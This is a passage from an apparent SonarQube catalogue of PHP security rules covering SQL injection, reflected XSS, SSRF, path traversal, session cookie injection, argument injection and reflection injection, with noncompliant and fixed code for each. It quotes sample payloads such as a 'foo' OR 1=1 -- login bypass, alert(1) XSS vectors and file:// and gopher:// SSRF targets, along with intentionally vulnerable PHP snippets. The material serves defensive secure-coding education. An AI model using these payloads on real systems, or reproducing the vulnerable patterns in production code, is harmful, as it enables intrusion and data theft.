  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S3649">
              phpsecurity:S3649
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul>
  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>
  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul>
      <li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">our article on this topic</a> </li>
    </ul>  </li>
</ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
foo' OR 1=1 --
</pre>
<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in
as any user within the scoped user table.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
class AuthenticationHandler {

    public mysqli $conn;

    function authenticate() {
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $authenticated = false;

        $query = "SELECT * FROM users WHERE user = '" . $user . "' AND pass = '" . $pass . "'";

        $stmt = $this-&gt;conn-&gt;query($query); // Noncompliant

        if ($stmt-&gt;num_rows == 1) {
          $authenticated = true;
        }

        return $authenticated;
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
class AuthenticationHandler {

    public mysqli $conn;

    function authenticate() {
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $authenticated = false;

        $query = "SELECT * FROM users WHERE user = :user AND pass = :pass";

        $stmt = $this-&gt;conn-&gt;prepare($query);
        $stmt-&gt;bind_param(":user", $user);
        $stmt-&gt;bind_param(":pass", $pass);
        $stmt-&gt;execute();

        $stmt-&gt;store_result();

        if ( $stmt-&gt;num_rows == 1) {
          $authenticated = true;
        }

        return $authenticated;
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use prepared statements</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an
interpreted context.</p>
<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the
following query string (Java SE syntax):</p>
<pre>
SELECT * FROM users WHERE user = ? AND pass = ?
</pre>
<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as
a placeholder.</strong></p>
<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals
corresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and
some do not - because they do it transparently.</p>
<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>
<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,
they are not considered application logic by the database.</p>
<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes
them.</p>
<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a
query. An attacker who controls this third-party data can cause the database to execute malicious code.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">SonarSource, Exploiting Hibernate Injections</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ">CERT, IDS00-J.</a> - Prevent SQL injection </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5131">
              phpsecurity:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains user input.</p>
<p>User input embedded in HTML code should be HTML-encoded to prevent the injection of additional code. PHP provides the built-in function
<code>htmlspecialchars</code> to do this.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
echo '&lt;h1&gt;' . $input . '&lt;/h1&gt;';
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
echo '&lt;h1&gt;' . htmlspecialchars($input) . '&lt;/h1&gt;';
</pre>
<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response with the
content-type header.</p>
<p>For example, setting the content-type to <code>text/plain</code> using the built-in <code>header</code> function allows to safely reflect user
input since browsers will not try to parse and execute the response.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="2" data-diff-type="noncompliant">
echo $input;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="2" data-diff-type="compliant">
header('Content-Type: text/plain');
echo $input;
</pre>
<h3>How does this work?</h3>
<h4>Encode data according to the HTML context</h4>
<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact
from the end user’s point of view but make it uninterpretable by web browsers.</p>
<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific
encoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>
<table>
  <colgroup>
    <col style="width: 25%;">
    <col style="width: 25%;">
    <col style="width: 25%;">
    <col style="width: 25%;">
  </colgroup>
  <thead>
    <tr>
      <th>Context</th>
      <th>Code example</th>
      <th>Exploit example</th>
      <th>Encoding</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td> <p>Inbetween tags</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div&gt;
  { data }
&lt;/div&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div&gt;
  &lt;script&gt;
    alert(1)
  &lt;/script&gt;
&lt;/div&gt;
</pre></td>
      <td> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>
        <ul>
          <li> &amp; → &amp;amp; </li>
          <li> &lt; → &amp;lt; </li>
          <li> &gt; → &amp;gt; </li>
          <li> " → &amp;quot; </li>
          <li> ' → &amp;#x27; </li>
        </ul> </td>
    </tr>
    <tr>
      <td> <p>In an attribute surrounded with single or double quotes</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag="{ data }"&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag=""
     onmouseover="alert(1)"&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>
        <ul>
          <li> &amp; → &amp;amp; </li>
          <li> &lt; → &amp;lt; </li>
          <li> &gt; → &amp;gt; </li>
          <li> " → &amp;quot; </li>
          <li> ' → &amp;#x27; </li>
        </ul> </td>
    </tr>
    <tr>
      <td> <p>In an unquoted attribute</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag={ data }&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag=foo
     onmouseover=alert(1)&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p> </td>
    </tr>
    <tr>
      <td> <p>In a URL attribute</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;a href="{ data }"&gt;
  ...
&lt;/a&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;a href="javascript:alert(1)"&gt;
  ...
&lt;/a&gt;
</pre></td>
      <td> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>
      as a scheme.</p> </td>
    </tr>
    <tr>
      <td> <p>In a script block</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;script&gt;
  { data }
&lt;/script&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;script&gt;
  alert(1)
&lt;/script&gt;
</pre></td>
      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>
&lt;!doctype html&gt;
&lt;script data="{ data }"&gt;
  ...
&lt;/script&gt;
</pre></td>
    </tr>
  </tbody>
</table>
<h3>Pitfalls</h3>
<h4>Content-types</h4>
<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to
cross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>
<ul>
  <li> application/mathml+xml </li>
  <li> application/rdf+xml </li>
  <li> application/vnd.wap.xhtml+xml </li>
  <li> application/xhtml+xml </li>
  <li> application/xml </li>
  <li> image/svg+xml </li>
  <li> multipart/x-mixed-replace </li>
  <li> text/html </li>
  <li> text/rdf </li>
  <li> text/xml </li>
  <li> text/xsl </li>
</ul>
<h4>Single quoted variables in attributes</h4>
<p>By default, <code>htmlspecialchars</code> does not encode single quotes, so if <code>$input</code> is untrusted, JavaScript code can be
injected.</p>
<p>Make sure to set the option <code>ENT_QUOTES</code> to encode single quotes.</p>
<h5>Noncompliant code example</h5>
<pre data-diff-id="3" data-diff-type="noncompliant">
echo "&lt;img src='" . htmlspecialchars($input) . "'&gt;";
</pre>
<h5>Compliant solution</h5>
<pre data-diff-id="3" data-diff-type="compliant">
echo "&lt;img src='" . htmlspecialchars($input, ENT_QUOTES) . "'&gt;";
</pre>
<h4>Headers and output</h4>
<p>If the HTTP body is sent before <code>header</code> is called, no headers will be sent to the client.</p>
<p>To fix this issue, send the headers before any output.</p>
<h5>Noncompliant code example</h5>
<pre data-diff-id="4" data-diff-type="noncompliant">
echo 'No more headers at this point';
header('Content-Type: text/plain');
echo $input;
</pre>
<h5>Compliant solution</h5>
<pre data-diff-id="4" data-diff-type="compliant">
header('Content-Type: text/plain');
echo $input;
</pre>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br> <a href="https://web.dev/csp-xss/">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>
  <li> <a href="https://blog.sonarsource.com/ghost-admin-takeover">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>
  <li> <a href="https://samy.pl/myspace/">Samy Kamkar, The MySpace Worm</a> </li>
</ul>
<h3>Conference presentations</h3>
<ul>
  <li> <a href="https://www.youtube.com/watch?v=ksq7e6UUDag">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5144">
              phpsecurity:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$host = $_GET['host'];
$url = "https://$host/.well-known/openid-configuration";

$ch = curl_init($url); // Noncompliant
curl_exec($ch);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$allowedHosts = ["trusted1" =&gt; "trusted1.example.com", "trusted2" =&gt; "trusted2.example.com"];
$host = $allowedHosts[$_GET['host']];
$url = "https://$host/.well-known/openid-configuration";

$ch = curl_init($url);
curl_exec($ch);
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">Top 10 2021 Category A10 - Server-Side Request
  Forgery (SSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/918">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S2083">
              phpsecurity:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$fileName = $_GET["filename"];

file_get_contents($fileName); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$fileName = $_GET["filename"];
$targetDirectory = "/path/to/target/directory/";

$path = realpath($targetDirectory . $fileName);

if (str_starts_with($path,  $targetDirectory)) {
    file_get_contents($path);
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths
constructed from untrusted data:</p>
<ol>
  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>
  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li>
  <li> Resolve the canonical path of the file by using methods like <code>`realPath`</code>. This will resolve relative path or path components like
  <code>../</code> and removes any ambiguity regarding the file’s location. </li>
  <li> Check that the canonical path is within the directory where the file should be located. </li>
</ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol>
  <li> <code>data = transform(user_input);</code> </li>
  <li> <code>data = normalize(data);</code> </li>
  <li> <code>data = sanitize(data);</code> </li>
  <li> <code>use(data);</code> </li>
</ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v=V-DdcKADnFk">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/22">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S6287">
              phpsecurity:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a
href="https://example.com?cookie=injectedcookie">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function checkCookie()
{
    if (!isset($_COOKIE['PHPSESSID'])) {
        $value = $_GET['cookie'];
        setcookie('PHPSESSID', $value); // Noncompliant
    }

    header('Location: /welcome.php');
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
function checkCookie()
{
    if (!isset($_COOKIE['PHPSESSID'])) {
        header('Location: /getcookie.php');
    }

    header('Location: /welcome.php');
}
</pre>
<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/384">CWE-384 - Session Fixation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S6350">
              phpsecurity:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920">CVE-2016-9920</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472">CVE-2021-29472</a> </li>
</ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Malicious arguments can result in undesired behavior in the executed command. </li>
  <li> Passing user input to a system command is not necessary. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid constructing system commands from user input when possible. </li>
  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>
  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
$input = $_GET['input'];
system('/usr/bin/find ' . escapeshellarg($input)); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
$input = $_GET['input'];
if (in_array($input, $allowed, true)) {
  system('/usr/bin/find ' . escapeshellarg($input));
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
  <li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S6173">
              phpsecurity:S6173
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Reflection injections occur in a web application when it retrieves data from a user or a third-party service and fully or partially uses it to
inspect, load or invoke a component by name.</p>
<p>If an application uses a reflection method in a way that is vulnerable to injections, it is exposed to attacks that aim to achieve remote code
execution on the server’s website.</p>
<p>A user with malicious intent exploits this by carefully crafting a string involving symbols such as class methods, that will help them change the
initial reflection logic to an impactful malicious one.</p>
<p>After creating the malicious request and triggering it, the attacker can attack the servers affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>If user-supplied values are used to choose which code is executed, an attacker may be able to supply carefully-chosen values that cause unexpected
code to run. The attacker can use this ability to run arbitrary code on the server.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting a seemingly-legitimate object, but whose properties might be used maliciously.</p>
<p>Depending on the application, attackers might be able to modify important data structures or content to escalate privileges or perform unwanted
actions. For example, with an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object triggering code execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul>
  <li> Download the internal server’s data, most likely to sell it. </li>
